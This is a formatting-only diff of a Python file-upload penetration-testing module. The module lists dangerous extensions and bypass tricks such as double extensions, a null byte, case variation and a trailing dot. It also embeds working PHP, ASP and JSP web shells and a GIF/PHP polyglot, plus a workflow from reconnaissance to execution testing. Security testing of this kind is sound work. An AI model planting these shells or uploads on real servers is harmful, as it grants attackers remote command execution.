@@ -5,7 +5,7 @@ This module provides a specialized framework for testing file upload vulnerabili
 including bypass techniques, web shells, and polyglot files.
 """
 
-from typing import Dict, Any
+from typing import Any, Dict
 
 
 class FileUploadTestingFramework:
@@ -13,10 +13,24 @@ class FileUploadTestingFramework:
 
     def __init__(self):
         self.malicious_extensions = [
-            ".php", ".php3", ".php4", ".php5", ".phtml", ".pht",
-            ".asp", ".aspx", ".jsp", ".jspx",
-            ".py", ".rb", ".pl", ".cgi",
-            ".sh", ".bat", ".cmd", ".exe"
+            ".php",
+            ".php3",
+            ".php4",
+            ".php5",
+            ".phtml",
+            ".pht",
+            ".asp",
+            ".aspx",
+            ".jsp",
+            ".jspx",
+            ".py",
+            ".rb",
+            ".pl",
+            ".cgi",
+            ".sh",
+            ".bat",
+            ".cmd",
+            ".exe",
         ]
 
         self.bypass_techniques = [
@@ -25,7 +39,7 @@ class FileUploadTestingFramework:
             "content_type_spoofing",
             "magic_bytes",
             "case_variation",
-            "special_characters"
+            "special_characters",
         ]
 
     def generate_test_files(self) -> Dict[str, Any]:
@@ -33,18 +47,22 @@ class FileUploadTestingFramework:
         test_files = {
             "web_shells": [
                 {"name": "simple_php_shell.php", "content": "<?php system($_GET['cmd']); ?>"},
-                {"name": "asp_shell.asp", "content": "<%eval request(\"cmd\")%>"},
-                {"name": "jsp_shell.jsp", "content": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"}
+                {"name": "asp_shell.asp", "content": '<%eval request("cmd")%>'},
+                {"name": "jsp_shell.jsp", "content": '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'},
             ],
             "bypass_files": [
                 {"name": "shell.php.txt", "technique": "double_extension"},
                 {"name": "shell.php%00.txt", "technique": "null_byte"},
                 {"name": "shell.PhP", "technique": "case_variation"},
-                {"name": "shell.php.", "technique": "trailing_dot"}
+                {"name": "shell.php.", "technique": "trailing_dot"},
             ],
             "polyglot_files": [
-                {"name": "polyglot.jpg", "content": "GIF89a<?php system($_GET['cmd']); ?>", "technique": "image_polyglot"}
-            ]
+                {
+                    "name": "polyglot.jpg",
+                    "content": "GIF89a<?php system($_GET['cmd']); ?>",
+                    "technique": "image_polyglot",
+                }
+            ],
         }
 
         return test_files
@@ -58,28 +76,28 @@ class FileUploadTestingFramework:
                     "name": "reconnaissance",
                     "description": "Identify upload endpoints",
                     "tools": ["katana", "gau", "paramspider"],
-                    "expected_findings": ["upload_forms", "api_endpoints"]
+                    "expected_findings": ["upload_forms", "api_endpoints"],
                 },
                 {
                     "name": "baseline_testing",
                     "description": "Test legitimate file uploads",
                     "test_files": ["image.jpg", "document.pdf", "text.txt"],
-                    "observations": ["response_codes", "file_locations", "naming_conventions"]
+                    "observations": ["response_codes", "file_locations", "naming_conventions"],
                 },
                 {
                     "name": "malicious_upload_testing",
                     "description": "Test malicious file uploads",
                     "test_files": self.generate_test_files(),
-                    "bypass_techniques": self.bypass_techniques
+                    "bypass_techniques": self.bypass_techniques,
                 },
                 {
                     "name": "post_upload_verification",
                     "description": "Verify uploaded files and test execution",
-                    "actions": ["file_access_test", "execution_test", "path_traversal_test"]
-                }
+                    "actions": ["file_access_test", "execution_test", "path_traversal_test"],
+                },
             ],
             "estimated_time": 360,
-            "risk_level": "high"
+            "risk_level": "high",
         }
 
         return workflow
